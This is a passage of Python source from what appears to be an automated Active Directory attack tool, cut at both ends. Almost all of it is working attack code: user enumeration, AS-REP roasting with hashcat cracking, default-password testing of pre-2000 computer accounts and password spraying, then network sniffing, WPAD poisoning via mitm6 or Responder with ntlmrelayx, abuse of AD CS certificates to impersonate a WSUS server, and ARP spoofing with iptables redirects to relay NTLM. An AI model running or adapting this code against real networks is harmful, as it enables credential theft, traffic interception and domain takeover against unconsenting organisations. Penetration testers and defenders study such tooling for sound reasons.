            log.warning(f"CLDAP userenum error: {e}")
    valid = []
    if out_file.exists():
        for line in out_file.read_text().splitlines():
            m = re.match(r"\[\+\]\s+(\S+)\s+exists", line)
            if m:
                valid.append(m.group(1))
    if valid:
        ok(f"CLDAP confirmed {len(valid)} valid user(s)")
        for u in valid[:10]:
            detail(u)
    return valid


def _asrep_roast_zero_auth(cfg: Config, users: list[str]) -> bool:
    """AS-REP roast a userlist with no creds. Cracks any DONT_REQ_PREAUTH user.

    Returns True if any credential was cracked into cfg.creds.
    """
    if not (tool_exists("impacket-GetNPUsers") and cfg.dc_ip and cfg.domain):
        return False
    if not users:
        return False
    user_file = cfg.work_dir / "asrep-userlist.txt"
    user_file.write_text("\n".join(users) + "\n")
    hash_file = cfg.work_dir / "asrep-hashes-zeroauth.txt"
    cmd = ["impacket-GetNPUsers", f"{cfg.domain}/", "-usersfile", str(user_file),
           "-no-pass", "-dc-ip", cfg.dc_ip, "-format", "hashcat",
           "-outputfile", str(hash_file)]
    log.info(f"🔍 AS-REP roast (zero-auth) over {len(users)} candidates")
    run(cmd, cfg, timeout=180)
    if not (hash_file.exists() and hash_file.stat().st_size > 0):
        log.info("No AS-REP roastable accounts (good preauth posture)")
        return False
    ok(f"AS-REP hashes captured: {hash_file}")
    # Crack what we got
    if tool_exists("hashcat"):
        cracked = cfg.work_dir / "asrep-cracked-zeroauth.txt"
        run(["hashcat", "-m", "18200", str(hash_file), "/usr/share/wordlists/rockyou.txt",
             "--quiet", "--outfile", str(cracked), "--outfile-format=2"],
            cfg, timeout=600)
        if cracked.exists() and cracked.stat().st_size > 0:
            for line in cracked.read_text().splitlines():
                # rockyou-cracked AS-REP comes back as just <password>
                if line.strip():
                    ok(f"🔑 Cracked AS-REP password — manual review needed: {cracked}")
                    return True
    return False


def _pre2k_autotest(cfg: Config) -> bool:
    """Pre-2000 computer accounts: default password = lowercase(computername).

    Reads pre2k results from v4.6.0 nxc enrichment if present, then auto-
    tests each candidate via nxc smb. Sets cfg.creds on first hit.
    """
    if not tool_exists("nxc"):
        return False
    pre2k_file = cfg.work_dir / "nxc-pre2k.txt"
    if not pre2k_file.exists():
        # Run pre2k inline if not already done
        cmd = ["nxc", "ldap", cfg.dc_ip, "-u", "", "-p", "", "-M", "pre2k"]
        run(cmd, cfg, timeout=120, outfile=pre2k_file)
    if not pre2k_file.exists():
        return False
    # Extract computer names from nxc output (look for SamAccountName-like lines)
    candidates = []
    for line in pre2k_file.read_text().splitlines():
        # nxc pre2k typically prints "[+] hostname$" or similar; conservative match
        m = re.search(r"\b([A-Za-z0-9_-]+)\$", line)
        if m:
            candidates.append(m.group(1))
    candidates = list(dict.fromkeys(candidates))  # dedupe, preserve order
    if not candidates:
        return False
    log.info(f"🔍 Auto-testing {len(candidates)} pre2k candidate(s)")
    for comp in candidates:
        sam = f"{comp}$"
        pwd = comp.lower()
        cmd = ["nxc", "smb", cfg.dc_ip, "-u", sam, "-p", pwd, "-d", cfg.domain]
        result = run(cmd, cfg, timeout=30)
        if result.returncode == 0 and "[+]" in (result.stdout or ""):
            ok(f"🔑 Pre2k credential works: {sam} / {pwd}")
            cfg.username = sam
            cfg.password = pwd
            return True
    return False


def _password_spray(cfg: Config, users: list[str], password: str) -> bool:
    """Single-password spray with one attempt per user. Stops on first hit.

    Lockout-aware: explicit single password only; user is responsible for
    timing if running multiple sprays.
    """
    if not (tool_exists("nxc") and password and users):
        return False
    user_file = cfg.work_dir / "spray-users.txt"
    user_file.write_text("\n".join(users) + "\n")
    # Sanitize the password into a safe filename component — it may contain
    # /, \, NUL, quotes, or other path-invalid chars that would crash the
    # write or, worst-case, traverse out of work_dir.
    pw_slug = re.sub(r"[^A-Za-z0-9_-]", "_", password)[:32] or "pw"
    out_file = cfg.work_dir / f"spray-{pw_slug}.txt"
    cmd = ["nxc", "smb", cfg.dc_ip, "-u", str(user_file), "-p", password,
           "-d", cfg.domain, "--continue-on-success"]
    log.info(f"🔍 Spraying '{password}' across {len(users)} user(s)")
    result = run(cmd, cfg, timeout=600, outfile=out_file)
    if not out_file.exists():
        return False
    for line in out_file.read_text().splitlines():
        # nxc success line example: "SMB <ip> 445 <host> [+] DOMAIN\\user:pass"
        m = re.search(r"\[\+\]\s+\S+\\(\S+):" + re.escape(password), line)
        if m:
            user = m.group(1)
            ok(f"🔑 Spray hit: {user} / {password}")
            cfg.username = user
            cfg.password = password
            return True
    log.info(f"Spray '{password}' returned no hits")
    return False


def run_credential_discovery(cfg: Config) -> bool:
    """Pre-cut credential discovery: 6 zero-auth foothold techniques.

    Order (cheap → expensive):
      1. Username enum via Kerberos (kerbrute)
      2. Username enum via CLDAP NetLogon ping (sensepost technique)
      3. AS-REP roast against discovered users (still zero-auth)
      4. Pre-2000 computer auto-test (default password = lowercase(host))
      5. Password spray (only if --spray-password given)

    Returns True if a credential was obtained (cfg.has_creds becomes True).
    All output goes to cfg.work_dir/*.txt for offline review.
    """
    if cfg.no_discover:
        log.info("--no-discover — skipping credential discovery phase")
        return False
    if not (cfg.dc_ip and cfg.domain):
        log.warning("Credential discovery needs cfg.dc_ip + cfg.domain — skipping")
        return False

    phase_header("PRE-CUT CREDENTIAL DISCOVERY (zero-auth foothold)")

    def _userenum_pass(candidates: list[str]) -> set[str]:
        """Run kerbrute then CLDAP over a candidate list, return valid users."""
        valid = set()
        try:
            kerb_valid = _userenum_kerbrute(cfg, candidates)
            valid.update(kerb_valid)
        except Exception as e:
            kerb_valid = []
            log.warning(f"kerbrute userenum failed: {e}")
        cldap_input = list(dict.fromkeys(kerb_valid + candidates))
        try:
            valid.update(_userenum_cldap(cfg, cldap_input))
        except Exception as e:
            log.warning(f"CLDAP userenum failed: {e}")
        return valid

    # Userenum via KRB-ERROR / CLDAP NetLogon is read-only at the protocol
    # level — no auth attempts, no lockout-counter ticks. So merge the
    # curated AD-biased list with SecLists in one pass. Curated entries
    # come first so they win the CLDAP cap (still 500 in _userenum_cldap).
    if cfg.users_file:
        # Operator explicitly chose a list — honor it as-is.
        candidates = _load_user_candidates(cfg, tier="ad")  # honors users_file inside
    else:
        ad = _load_user_candidates(cfg, tier="ad")
        seclists = _load_user_candidates(cfg, tier="seclists")
        # dedupe-preserving merge: curated first, then SecLists tail
        candidates = list(dict.fromkeys(ad + seclists))
    log.info(f"Candidates (curated ∪ SecLists, deduped): {len(candidates)}")
    valid = _userenum_pass(candidates)

    if valid:
        cfg.discovered_users = sorted(valid)
        users_file = cfg.work_dir / "valid-users.txt"
        users_file.write_text("\n".join(cfg.discovered_users) + "\n")
        ok(f"Confirmed {len(valid)} valid user(s) — saved to {users_file}")
    else:
        log.info("No users confirmed — falling back to candidate list for next steps")
        cfg.discovered_users = candidates

    # Step 3: AS-REP roast (zero-auth)
    try:
        if _asrep_roast_zero_auth(cfg, cfg.discovered_users):
            return True
    except Exception as e:
        log.warning(f"AS-REP zero-auth roast failed: {e}")

    # Step 4: Pre2k auto-test
    try:
        if _pre2k_autotest(cfg):
            return True
    except Exception as e:
        log.warning(f"pre2k auto-test failed: {e}")

    # Step 5: Spray (only if user explicitly opted in)
    if cfg.spray_password:
        try:
            if _password_spray(cfg, cfg.discovered_users, cfg.spray_password):
                return True
        except Exception as e:
            log.warning(f"Password spray failed: {e}")
    else:
        detail("No --spray-password given — skipping spray")

    log.info("Credential discovery did not yield creds — falling through to ARP/WPAD/etc.")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Passive Traffic Discovery (WPAD / WSUS / LLMNR / DHCPv6)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def passive_sniff(cfg: Config, duration: int = 30) -> dict:
    """Passively sniff the network to detect WPAD, WSUS, LLMNR, DHCPv6, and PXE/TFTP traffic.

    Uses tcpdump to listen for:
    - LLMNR queries (UDP 5355) — indicates WPAD poisoning is viable
    - mDNS queries (UDP 5353) — WPAD via mDNS
    - DHCPv6 solicitations (UDP 547) — mitm6 attack is viable
    - WSUS HTTP traffic (TCP 8530/8531) — active WSUS clients
    - DNS queries for 'wpad' — WPAD in use
    - NBT-NS queries (UDP 137) — NetBIOS name resolution for WPAD
    - DHCP PXE boot (UDP 67/68) — PXE boot environment present
    - TFTP traffic (UDP 69) — PXE image transfer or other unauth file transfers
    - SCCM ProxyDHCP (UDP 4011) — SCCM PXE Distribution Point

    Returns dict with keys: wpad_llmnr, wpad_mdns, wpad_dns, dhcpv6, wsus, nbtns, pxe, tftp
    each containing a list of source IPs seen.
    """
    phase_header("PASSIVE NETWORK DISCOVERY")
    log.info(f"👂 Listening passively for {duration}s to detect WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic...")

    results = {
        "wpad_llmnr": set(),
        "wpad_mdns": set(),
        "wpad_dns": set(),
        "dhcpv6": set(),
        "wsus": set(),
        "nbtns": set(),
        "pxe": set(),
        "tftp": set(),
        "domains": set(),   # Domain names seen in traffic
        "dcs": {},          # ip -> set of AD services seen on that IP's well-known ports
    }

    if not tool_exists("tcpdump"):
        log.warning("tcpdump not found — skipping passive discovery (apt install tcpdump)")
        return {k: list(v) for k, v in results.items()}

    iface = cfg.iface or "eth0"
    capture_file = cfg.work_dir / "passive-capture.txt"

    # Capture filter: LLMNR, mDNS, DHCPv6, WSUS, DNS, NBT-NS, PXE/DHCP, TFTP,
    # SCCM, plus AD-DC fingerprinting ports (Kerberos/LDAP/LDAPS/SMB).
    bpf = (
        "udp port 5355 or "         # LLMNR
        "udp port 5353 or "         # mDNS
        "udp port 547 or "          # DHCPv6
        "tcp port 8530 or "         # WSUS HTTP
        "tcp port 8531 or "         # WSUS HTTPS
        "udp port 53 or "           # DNS
        "udp port 137 or "          # NBT-NS
        "udp port 67 or "           # DHCP server (PXE boot requests)
        "udp port 68 or "           # DHCP client
        "udp port 69 or "           # TFTP (PXE image transfers)
        "udp port 4011 or "         # SCCM ProxyDHCP
        "tcp port 88 or "           # Kerberos (DC)
        "udp port 88 or "           # Kerberos UDP (DC)
        "tcp port 389 or "          # LDAP (DC)
        "tcp port 636 or "          # LDAPS (DC)
        "tcp port 445"              # SMB (DC and member servers)
    )

    # Run tcpdump for the full duration — timeout is the only limit
    # (no -c flag, so it captures all packets until timeout expires)
    log.info(f"Capturing for {duration}s on {iface}...")
    result = run(
        ["tcpdump", "-i", iface, "-n", "-l", bpf],
        cfg, timeout=duration, capture=True,
        outfile=capture_file
    )

    if not capture_file.exists():
        log.warning("No traffic captured")
        return {k: list(v) for k, v in results.items()}

    content = capture_file.read_text()

    for line in content.splitlines():
        src_match = re.match(r"[\d:.]+ IP6? (\S+?)[\.\d]* > ", line)
        if not src_match:
            src_match = re.match(r"[\d:.]+ (\d+\.\d+\.\d+\.\d+)\.\d+ > ", line)
        src_ip = src_match.group(1) if src_match else ""

        line_lower = line.lower()

        # LLMNR (port 5355)
        if ".5355" in line and src_ip:
            if "wpad" in line_lower:
                results["wpad_llmnr"].add(src_ip)
            else:
                results["wpad_llmnr"].add(src_ip)  # Any LLMNR = poisoning viable

        # mDNS (port 5353)
        if ".5353" in line and "wpad" in line_lower and src_ip:
            results["wpad_mdns"].add(src_ip)

        # DHCPv6 (port 547) — Solicit messages
        if ".547" in line and src_ip:
            results["dhcpv6"].add(src_ip)

        # WSUS traffic (ports 8530/8531)
        if (".8530" in line or ".8531" in line) and src_ip:
            results["wsus"].add(src_ip)

        # DNS queries for wpad
        if "53" in line and "wpad" in line_lower and src_ip:
            results["wpad_dns"].add(src_ip)

        # NBT-NS (port 137) — wpad queries
        if ".137" in line and "wpad" in line_lower and src_ip:
            results["nbtns"].add(src_ip)

        # PXE boot — DHCP with PXEClient vendor class or boot filename
        if (".67" in line or ".68" in line) and src_ip:
            if "pxe" in line_lower or "boot" in line_lower or "wds" in line_lower:
                results["pxe"].add(src_ip)

        # TFTP traffic (port 69) — image transfer, no authentication
        if ".69" in line and src_ip:
            results["tftp"].add(src_ip)

        # SCCM ProxyDHCP (port 4011)
        if ".4011" in line and src_ip:
            results["pxe"].add(src_ip)

        # AD DC fingerprinting: any host seen on a well-known AD service port
        # is a candidate Domain Controller (or member server for SMB).
        # Greedy [\w.:]+ swallows v4 and v6 addresses; backtracks to the
        # rightmost ".<digits>" boundary.
        ad_ports = {
            "88":  "Kerberos",
            "389": "LDAP",
            "636": "LDAPS",
            "445": "SMB",
        }
        endpoint = re.match(
            r"\d{2}:\d{2}:\d{2}\.\d+\s+IP6?\s+([\w.:]+)\.(\d+)\s+>\s+([\w.:]+)\.(\d+)",
            line,
        )
        if endpoint:
            s_ip, s_port, d_ip, d_port = endpoint.groups()
            if s_port in ad_ports:
                results["dcs"].setdefault(s_ip, set()).add(ad_ports[s_port])
            if d_port in ad_ports:
                results["dcs"].setdefault(d_ip, set()).add(ad_ports[d_port])

        # AD-aware DNS SRV: `_ldap._tcp.dc._msdcs.<domain>` queries are the
        # canonical "find me a DC" signal. The destination of the query is
        # an AD-integrated DNS server (frequently the DC itself).
        msdcs_match = re.search(
            r"SRV\?\s+(?:_\w+\._\w+\.)?dc\._msdcs\.([\w.-]+)",
            line, re.IGNORECASE
        )
        if msdcs_match:
            dom = msdcs_match.group(1).lower().rstrip(".")
            if dom:
                results["domains"].add(dom)
            # The destination of the DNS query is the candidate AD DNS/DC
            dns_dst = re.search(
                r"\s+>\s+([\w.:]+)\.53\b", line
            )
            if dns_dst:
                results["dcs"].setdefault(dns_dst.group(1), set()).add("AD-DNS")

        # Extract domain names from DNS queries, Kerberos, LDAP, SMB traffic
        # DNS queries: "A? dc01.corp.local" or "SRV? _ldap._tcp.corp.local"
        dns_match = re.findall(r"[A-Z]+\?\s+\S+?\.([a-zA-Z0-9-]+\.[a-zA-Z]{2,}(?:\.[a-zA-Z]{2,})?)", line)
        for dom in dns_match:
            dom = dom.lower().rstrip(".")
            # Filter out non-AD domains
            if dom and not dom.endswith((".in-addr.arpa", ".ip6.arpa", ".cloudfront.net",
                                         ".googleapis.com", ".amazonaws.com", ".azure.com",
                                         ".microsoft.com", ".windows.com", ".akamai.net",
                                         ".google.com", ".gstatic.com")):
                results["domains"].add(dom)

        # Kerberos: realm names in AS-REQ/TGS-REQ
        krb_match = re.findall(r"realm[:\s]+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", line, re.IGNORECASE)
        for dom in krb_match:
            results["domains"].add(dom.lower())

        # NTLM: domain names in NTLMSSP messages
        ntlm_match = re.findall(r"NTLMSSP.*?(?:Domain|Target)[:\s]+([a-zA-Z0-9.-]+)", line, re.IGNORECASE)
        for dom in ntlm_match:
            if "." in dom:
                results["domains"].add(dom.lower())

    # Report findings
    separator()
    found_anything = False

    if results["wpad_llmnr"]:
        ok(f"📡 LLMNR queries detected from {len(results['wpad_llmnr'])} host(s) — WPAD poisoning viable")
        for ip in sorted(results["wpad_llmnr"]):
            detail(ip)
        found_anything = True

    if results["wpad_dns"]:
        ok(f"🌐 WPAD DNS queries from {len(results['wpad_dns'])} host(s)")
        for ip in sorted(results["wpad_dns"]):
            detail(ip)
        found_anything = True

    if results["dhcpv6"]:
        ok(f"🔌 DHCPv6 solicitations from {len(results['dhcpv6'])} host(s) — mitm6 attack viable")
        for ip in sorted(results["dhcpv6"]):
            detail(ip)
        found_anything = True

    if results["wsus"]:
        ok(f"📦 WSUS traffic from {len(results['wsus'])} host(s) — WSUS relay viable")
        for ip in sorted(results["wsus"]):
            detail(ip)
        found_anything = True

    if results["nbtns"]:
        ok(f"📡 NBT-NS WPAD queries from {len(results['nbtns'])} host(s)")
        for ip in sorted(results["nbtns"]):
            detail(ip)
        found_anything = True

    if results["pxe"]:
        ok(f"🖥️  PXE boot traffic from {len(results['pxe'])} host(s) — PXE credential theft viable")
        for ip in sorted(results["pxe"]):
            detail(ip)
        found_anything = True

    if results["tftp"]:
        ok(f"📂 TFTP traffic from {len(results['tftp'])} host(s) — unauthenticated file transfers")
        for ip in sorted(results["tftp"]):
            detail(ip)
        found_anything = True

    if results["dcs"]:
        # Sort DC candidates by service-count descending so the strongest
        # candidate is reported first. AD-DNS-only is the weakest signal.
        ranked = sorted(
            results["dcs"].items(),
            key=lambda kv: (-len(kv[1]), kv[0]),
        )
        ok(f"🏛️  AD DC candidate(s) detected: {len(ranked)}")
        for ip, svcs in ranked:
            detail(f"{ip}  ({', '.join(sorted(svcs))})")
        # Auto-fill cfg.dc_ip if a strong candidate exists and not user-set.
        # Strong = has at least Kerberos or LDAP (i.e., not just AD-DNS).
        if not cfg.dc_ip:
            for ip, svcs in ranked:
                if {"Kerberos", "LDAP", "LDAPS"} & svcs:
                    cfg.dc_ip = ip
                    ok(f"Auto-detected DC IP from passive sniff: {cfg.dc_ip}")
                    break
        found_anything = True

    if results["domains"]:
        ok(f"🏢 Domain name(s) detected in traffic:")
        for dom in sorted(results["domains"]):
            detail(dom)
        found_anything = True
        # Auto-set domain if not already specified
        if not cfg.domain:
            # Prefer domains with common AD TLDs
            best_domain = ""
            for dom in sorted(results["domains"]):
                if dom.endswith((".local", ".internal", ".corp", ".lan", ".ad")):
                    best_domain = dom
                    break
            if not best_domain:
                best_domain = sorted(results["domains"])[0]
            cfg.domain = best_domain
            ok(f"Auto-detected domain from traffic: {cfg.domain}")

    if not found_anything:
        log.warning(f"No WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic detected in {duration}s")
        log.warning("This doesn't mean attacks won't work — clients may not have queried yet")

    # Save results
    discovery_file = cfg.work_dir / "passive-discovery.txt"
    lines = []
    for key, ips in results.items():
        if not ips:
            continue
        lines.append(f"[{key}]")
        if key == "dcs":
            # dict of ip -> set(services)
            for ip, svcs in sorted(ips.items()):
                lines.append(f"  {ip}  ({', '.join(sorted(svcs))})")
        else:
            for ip in sorted(ips):
                lines.append(f"  {ip}")
    if lines:
        discovery_file.write_text("\n".join(lines) + "\n")
        detail(f"Results saved to {discovery_file}")

    out = {}
    for k, v in results.items():
        out[k] = {ip: sorted(s) for ip, s in v.items()} if k == "dcs" else list(v)
    return out


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 4: WPAD Poisoning (mitm6 / Responder)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_wsus_server(cfg: Config) -> str:
    """Try to discover WSUS server on the network via LDAP GPO or port scan."""
    if cfg.wsus_server:
        return cfg.wsus_server

    # Scan common WSUS ports on the subnet
    log.info("🔍 Scanning for WSUS servers (ports 8530/8531)...")
    if not tool_exists("nmap"):
        log.warning("nmap not available for WSUS discovery")
        return ""

    target = cfg.specific_target or cfg.target_net or cfg.dc_ip
    if not target:
        return ""

    result = run(
        ["nmap", "-sT", "-n", "-Pn", "--open", "-p", "8530,8531", target],
        cfg, timeout=120
    )
    hosts = re.findall(
        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?(?:8530|8531)/tcp\s+open",
        result.stdout, re.DOTALL
    )
    if hosts:
        wsus = hosts[0]
        ok(f"WSUS server found: {wsus}")
        cfg.wsus_server = wsus
        return wsus

    log.warning("No WSUS server detected on network")
    return ""


def run_wpad_attack(cfg: Config) -> bool:
    """Run WPAD poisoning via mitm6 or Responder + ntlmrelayx relay.

    mitm6 poisons IPv6 DNS → victims resolve WPAD to attacker →
    ntlmrelayx serves WPAD proxy auth → captures/relays NTLM.
    """
    phase_header("PHASE 4: WPAD POISONING")

    relay_target = cfg.specific_target or (f"ldaps://{cfg.dc_ip}" if cfg.dc_ip else "")
    if not relay_target:
        log.error("No relay target — need --target or --dc-ip for WPAD relay")
        return False

    iface = cfg.iface or "eth0"
    relay_output = cfg.work_dir / "wpad-relay.txt"
    hash_output = cfg.work_dir / "wpad-hashes"
    bg_procs = []

    use_mitm6 = tool_exists("mitm6")
    use_responder = tool_exists("responder")

    if not use_mitm6 and not use_responder:
        log.error("Need mitm6 or responder for WPAD attack")
        log.warning("Install: pipx install mitm6  OR  apt install responder")
        return False

    try:
        # Start ntlmrelayx with WPAD hosting
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", relay_target,
            "-smb2support",
            "-of", str(hash_output),
            "--no-smb-server",
        ]

        if cfg.dc_ip and relay_target.startswith("ldap"):
            relay_cmd += ["-wh", f"wpad.{cfg.domain}"]
            if not cfg.no_shadow_creds:
                relay_cmd += ["--shadow-credentials"]
            elif not cfg.no_rbcd:
                relay_cmd += ["--delegate-access"]
        else:
            relay_cmd += ["-wh", f"wpad.{cfg.domain}"]

        if cfg.use_socks:
            relay_cmd += ["-socks"]

        # AppLocker-aware command execution
        if cfg.applocker and cfg.custom_cmd:
            relay_cmd += ["--execute-cmd", _build_applocker_cmd(cfg)]
        elif cfg.custom_cmd:
            relay_cmd += ["--execute-cmd", cfg.custom_cmd]

        relay_cmd += ["-6"]  # Listen on IPv4 and IPv6

        log.info("🎣 Starting ntlmrelayx with WPAD hosting...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for WPAD relay")
            return False
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # Start poisoning
        if use_mitm6 and cfg.domain:
            log.info(f"🌐 Starting mitm6 IPv6 DNS poisoning for {cfg.domain}...")
            mitm6_cmd = ["mitm6", "-d", cfg.domain, "-i", iface]
            mitm6_proc = run(
                mitm6_cmd, cfg, bg=True,
                outfile=cfg.work_dir / "mitm6.txt"
            )
            if hasattr(mitm6_proc, 'poll'):
                bg_procs.append(mitm6_proc)
        elif use_responder:
            log.info(f"📡 Starting Responder WPAD poisoning on {iface}...")
            resp_cmd = ["responder", "-I", iface, "-wPv"]
            resp_proc = run(
                resp_cmd, cfg, bg=True,
                outfile=cfg.work_dir / "responder-wpad.txt"
            )
            if hasattr(resp_proc, 'poll'):
                bg_procs.append(resp_proc)

        ok("WPAD poisoning + relay running, waiting for victims...")
        max_wait = cfg.poison_duration
        waited = 0
        captured = False
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                if re.search(r"authenticated|SUCCEED|hash|delegate|computer.*account",
                             content, re.IGNORECASE):
                    ok("🎣 Captured NTLM authentication via WPAD!")
                    captured = True
                    break
            time.sleep(5)
            waited += 5
            if waited % 30 == 0:
                log.info(f"⏳ WPAD poisoning active... ({waited}/{max_wait}s)")

        # Extract any captured hashes
        extract_hashes(cfg)

        if captured:
            success_box("WPAD poisoning captured authentication")
            return True
        else:
            log.warning(f"No WPAD authentication captured within {max_wait}s")
            log.warning("Clients may need to trigger WPAD (e.g., open browser, Windows Update)")
            return False

    finally:
        log.info("🛑 Stopping WPAD poisoning...")
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 5: WSUS Exploitation
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _acquire_wsus_cert(wsus_server: str, cfg: Config) -> tuple[str, str] | None:
    """Abuse AD CS to get a certificate trusted by WSUS clients.

    Per TrustedSec research: find a template with "Enrollee Supplies Subject"
    enabled, request a cert with the WSUS server's FQDN as SAN, extract
    PEM cert + key for ntlmrelayx HTTPS interception.
    """
    if not tool_exists("certipy"):
        return None

    cert_dir = cfg.work_dir / "wsus-cert"
    cert_dir.mkdir(exist_ok=True)

    template = ""
    ca_name = ""

    # Step 1a: Try Certihound first (ESC1 implies Enrollee Supplies Subject)
    ch_result = _certihound_find(cfg)
    if ch_result:
        for esc, tmpl in ch_result["vulns"]:
            if esc == "ESC1" and tmpl and tmpl != "unknown":
                template = tmpl
                break
        ca_name = ch_result["ca_name"]

    # Step 1b: Fallback to certipy find if Certihound missed it
    if not template or not ca_name:
        log.info("🔍 Enumerating AD CS templates with certipy...")
        find_result = run(
            ["certipy", "find", "-u", f"{cfg.username}@{cfg.domain}",
             "-p", cfg.password, "-dc-ip", cfg.dc_ip, "-enabled",
             "-stdout"],
            cfg, timeout=120
        )

        if find_result.returncode != 0:
            log.warning("certipy enumeration failed")
            return None

        if "Enrollee Supplies Subject" not in find_result.stdout:
            log.warning("No vulnerable AD CS templates found (need 'Enrollee Supplies Subject')")
            return None

        if not template:
            template_match = re.search(
                r"Template Name\s*:\s*(\S+).*?Enrollee Supplies Subject\s*:\s*True",
                find_result.stdout, re.DOTALL
            )
            if not template_match:
                log.warning("Could not parse vulnerable template name from certipy output")
                return None
            template = template_match.group(1)

        if not ca_name:
            ca_match = re.search(r"CA Name\s*:\s*(.+)", find_result.stdout)
            ca_name = ca_match.group(1).strip() if ca_match else ""

    ok(f"Found vulnerable template: {template}")
    if not ca_name:
        log.warning("Could not determine CA name")
        return None

    # Resolve WSUS FQDN
    wsus_fqdn = wsus_server
    if not "." in wsus_fqdn and cfg.domain:
        wsus_fqdn = f"{wsus_server}.{cfg.domain}"

    # Step 2: Request certificate with WSUS server SAN
    pfx_path = cert_dir / "wsus.pfx"
    log.info(f"📜 Requesting certificate for {wsus_fqdn} via template '{template}'...")
    req_result = run(
        ["certipy", "req",
         "-u", f"{cfg.username}@{cfg.domain}",
         "-p", cfg.password,
         "-ca", ca_name,
         "-template", template,
         "-subject", f"CN={wsus_fqdn}",
         "-dns", wsus_fqdn,
         "-out", str(pfx_path),
         "-dc-ip", cfg.dc_ip],
        cfg, timeout=60
    )

    if req_result.returncode != 0 or not pfx_path.exists():
        log.warning("Certificate request failed")
        return None

    # Step 3: Extract cert and key from PFX
    cert_path = cert_dir / "wsus.crt"
    key_path = cert_dir / "wsus.key"

    run(["openssl", "pkcs12", "-in", str(pfx_path), "-clcerts", "-nokeys",
         "-out", str(cert_path), "-passin", "pass:"], cfg, timeout=10)
    run(["openssl", "pkcs12", "-in", str(pfx_path), "-nocerts", "-nodes",
         "-out", str(key_path), "-passin", "pass:"], cfg, timeout=10)

    if cert_path.exists() and key_path.exists():
        ok(f"Extracted cert: {cert_path}")
        ok(f"Extracted key: {key_path}")
        return str(cert_path), str(key_path)

    log.warning("Failed to extract cert/key from PFX")
    return None


def run_wsus_relay(cfg: Config) -> bool:
    """Intercept WSUS client traffic via ARP spoof + ntlmrelayx on port 8530/8531.

    Based on TrustedSec research: ARP spoof → redirect WSUS HTTP traffic →
    ntlmrelayx captures machine account NTLM → relay to LDAP/SMB.
    """
    phase_header("PHASE 5a: WSUS NTLM RELAY")

    wsus_server = detect_wsus_server(cfg)
    if not wsus_server:
        log.warning("No WSUS server found — skipping WSUS relay")
        return False

    port = cfg.wsus_port or (WSUS_HTTPS_PORT if cfg.wsus_https else WSUS_HTTP_PORT)
    relay_target = cfg.specific_target or (f"ldap://{cfg.dc_ip}" if cfg.dc_ip else "")
    if not relay_target:
        log.error("Need --target or --dc-ip for WSUS relay")
        return False

    iface = cfg.iface or "eth0"
    relay_output = cfg.work_dir / "wsus-relay.txt"
    hash_output = cfg.work_dir / "wsus-hashes"
    bg_procs = []

    spoof_tool = find_tool("arpspoof", "bettercap")
    if not spoof_tool:
        log.error("Need arpspoof or bettercap for WSUS relay")
        return False

    # Auto-acquire certificate for HTTPS interception via AD CS abuse
    if cfg.wsus_https and not cfg.wsus_certfile and cfg.has_creds and tool_exists("certipy"):
        log.info("🔐 Attempting AD CS certificate abuse for WSUS HTTPS interception...")
        cert_result = _acquire_wsus_cert(wsus_server, cfg)
        if cert_result:
            cfg.wsus_certfile, cfg.wsus_keyfile = cert_result
            ok(f"Certificate acquired: {cfg.wsus_certfile}")
        else:
            log.warning("Could not auto-acquire certificate — HTTPS relay may fail")

    # Enable IP forwarding
    old_forward = "0"
    try:
        old_forward = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1")
    except OSError as e:
        log.error(f"Cannot enable IP forwarding: {e}")
        return False

    try:
        # Set up iptables redirect for WSUS port
        log.info(f"🔀 Redirecting port {port} traffic via iptables...")
        run(["iptables", "-t", "nat", "-A", "PREROUTING",
             "-p", "tcp", "--dport", str(port), "-j", "REDIRECT",
             "--to-ports", str(port)], cfg, timeout=10)

        # Start ntlmrelayx on the WSUS port
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", relay_target,
            "-smb2support",
            "-of", str(hash_output),
            "--http-port", str(port),
            "--keep-relaying",
            "-socks",
        ]

        if cfg.wsus_https and cfg.wsus_certfile and cfg.wsus_keyfile:
            relay_cmd += [
                "--https",
                "--certfile", cfg.wsus_certfile,
                "--keyfile", cfg.wsus_keyfile,
            ]

        log.info(f"🎣 Starting ntlmrelayx on port {port} for WSUS relay...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for WSUS relay")
            return False
        bg_procs.append(relay_proc)
        time.sleep(2)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # ARP spoof WSUS clients → attacker (so their WSUS traffic hits us)
        # We need to discover which hosts are talking to the WSUS server
        live_hosts = discover_live_hosts(cfg) if not cfg.specific_target else [cfg.specific_target]
